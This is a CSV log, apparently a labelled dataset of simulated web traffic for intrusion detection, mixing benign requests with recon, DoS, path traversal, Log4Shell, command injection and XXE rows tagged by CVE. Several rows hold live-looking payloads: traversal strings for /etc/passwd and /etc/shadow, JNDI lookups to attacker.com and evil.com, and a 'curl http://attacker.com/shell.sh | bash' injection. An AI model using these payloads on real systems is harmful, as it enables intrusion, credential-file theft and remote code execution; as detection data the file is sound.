timestamp,attack_type,cve,cvss_score,severity,payload_snippet,label,status_code
2026-05-21T12:46:04.042248,recon,N/A,0,LOW,/.git/config,1,N/A
2026-05-21T12:46:06.316482,recon,N/A,0,LOW,/web.config,1,N/A
2026-05-21T12:46:10.258651,recon,N/A,0,LOW,/.git/config,1,N/A
2026-05-21T12:46:14.153618,recon,N/A,0,LOW,/wp-admin,1,N/A
2026-05-21T12:46:18.418776,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:46:21.470911,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:46:24.192295,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:46:27.809172,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:27.871549,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:30.036731,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:30.098259,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:32.218178,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:32.307568,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:34.491525,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:34.628876,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:36.661085,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:36.852297,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:38.878635,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:39.001197,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:41.077830,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:41.139724,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:43.339603,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:43.430749,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:45.664788,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:46:48.252392,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:46:51.020277,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:46:54.094543,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:46:57.029534,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:46:59.882420,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:47:02.273615,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:05.208380,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:47:06.673597,path_traversal,CVE-2021-41773,9.8,CRITICAL,....//....//....//etc/passwd,1,N/A
2026-05-21T12:47:08.922376,path_traversal,CVE-2021-41773,9.8,CRITICAL,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1,N/A
2026-05-21T12:47:11.180143,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:47:13.559010,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:47:16.075865,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:47:18.634135,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:47:21.170703,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:23.987886,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:27.055893,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:47:32.276818,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:dns://attacker.com},1,N/A
2026-05-21T12:47:36.422612,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:ldaps://evil.com:1389/Exploit},1,N/A
2026-05-21T12:47:38.985695,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:41.437564,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:44.118817,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:47.153223,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:48:07.317338,cmd_injection,CVE-2021-22205,10.0,CRITICAL,; cat /etc/passwd,1,N/A
2026-05-21T12:48:09.580593,cmd_injection,CVE-2021-22205,10.0,CRITICAL,|| ping -c 3 attacker.com,1,201
2026-05-21T12:48:13.293916,cmd_injection,CVE-2020-14882,9.8,CRITICAL,; curl http://attacker.com/shell.sh | bash,1,N/A
2026-05-21T12:48:15.654848,cmd_injection,CVE-2021-22205,10.0,CRITICAL,`id`,1,201
2026-05-21T12:48:18.153799,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:48:20.805729,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:48:23.799825,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:48:26.479420,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:48:29.373558,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:48:32.006909,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:48:34.583726,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:48:37.922765,recon,N/A,0,LOW,/xmlrpc.php,1,N/A
2026-05-21T12:48:40.200949,recon,N/A,0,LOW,/admin,1,N/A
2026-05-21T12:48:43.998866,recon,N/A,0,LOW,/server-status,1,N/A
2026-05-21T12:48:46.318776,recon,N/A,0,LOW,/web.config,1,N/A
2026-05-21T12:48:48.461209,recon,N/A,0,LOW,/cgi-bin/test.cgi,1,N/A
2026-05-21T12:48:53.155582,recon,N/A,0,LOW,/wp-admin,1,N/A
2026-05-21T12:48:55.417575,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:48:57.915021,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:49:00.875487,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:49:03.588973,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:49:07.683864,xxe,CVE-2021-27065,7.8,HIGH,<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd,1,201
2026-05-21T12:49:10.175389,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:49:12.535012,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:49:15.703281,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:49:18.290009,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:49:21.267399,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:49:23.798115,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:49:27.307748,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:27.401178,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:29.444444,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:29.588680,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:31.653117,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:31.780786,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:33.838131,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:33.982163,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:36.087660,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:36.177502,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:38.338760,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:38.430422,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:40.612020,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:40.699189,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:42.800463,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:42.865423,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:49:44.943205,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:49:47.772990,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:49:50.730872,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:49:53.977026,path_traversal,CVE-2021-41773,9.8,CRITICAL,/../../../etc/shadow,1,N/A
2026-05-21T12:49:54.175541,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%252f..%252f..%252fetc%252fpasswd,1,N/A
2026-05-21T12:49:56.501902,path_traversal,CVE-2021-41773,9.8,CRITICAL,/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1,N/A
2026-05-21T12:49:56.714608,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,1,N/A
2026-05-21T12:49:59.191444,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:50:01.790188,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:50:04.888975,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:50:07.871771,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:50:10.496899,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:50:29.044370,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:50:29.077369,dos,N/A,0,HIGH,large_payload,1,201
